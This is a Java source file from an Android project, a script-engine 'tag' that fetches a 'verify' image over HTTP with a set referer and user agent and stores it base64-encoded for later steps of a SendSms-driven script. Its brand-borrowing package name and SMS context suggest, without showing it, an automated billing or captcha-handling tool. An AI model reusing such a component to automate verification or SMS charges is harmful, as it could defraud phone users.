package com.baidu.alipay.script;

import java.util.List;

import com.baidu.alipay.LogUtil;
import com.baidu.alipay.net.HttpConnect;

import android.content.Context;
import android.util.Base64;

/**
 * 1.5.6
 * @author leoliu
 *
 */
public class Base64Img extends Tags{

	private static final String TAG = "base64Img";
	
	private static final String PROP_IMGURL = "imgUrl";
	private static final String PROP_KEYNAME = "keyName";
	
	private String imgUrl;
	private String keyName;
	
	public Base64Img(String xml,boolean dynamic){
		this.imgUrl = getNodeValue(xml, PROP_IMGURL);
		this.keyName = getNodeValue(xml, PROP_KEYNAME);
		this.dynamic = dynamic;
	}
	
	@Override
	public String work(Context context, SendSms sendSms, List<Tags> tagsList, int pos) {
		
		String Url_ = formatUrl(sendSms,imgUrl);
        
        int tryTimes = 0;
        byte[] backStream = null;
        int succTimes = 0;
        
        while(tryTimes < 4 && (backStream == null || succTimes < 1)){
        	try {
        		if(tryTimes > 0){
        			Thread.sleep(1000 * 2);
        		}
        		
            	HttpConnect conn = new HttpConnect(context);
            	conn.isProxy = false;
                
//                LogUtil.e(TAG, "verify img 方法第"+tryTimes+"次访问" + Url_);
                
                backStream = conn.request(sendSms,Url_, "GET", referer, sendSms.getUa(), null,
                        null, 0, false);
                
                if (backStream == null) {
//                    LogUtil.e(TAG, "verify Img方法400错误");
                    errorReason = "v_400_";
                }else{
                	succTimes ++;
                }
                
                conn = null;
                
                System.gc();
            } catch (Exception ex) {
                ex.printStackTrace();
                
                errorReason = "V_" + "_" + ex.getMessage();
            }
        	
        	tryTimes ++;
        }
        
        if(backStream == null){
        	return TAGS_EXEC_FAIL;
        }else{
        	String base64Str = new String(Base64.encode(backStream, Base64.DEFAULT));
        	
        	sendSms.setDataValue(keyName,base64Str);
        	
        	errorReason = "";
        	
        	return TAGS_EXEC_SUCC;
        }
	}

	@Override
	public String getTag() {
		return TAGS_BASE64IMG;
	}
}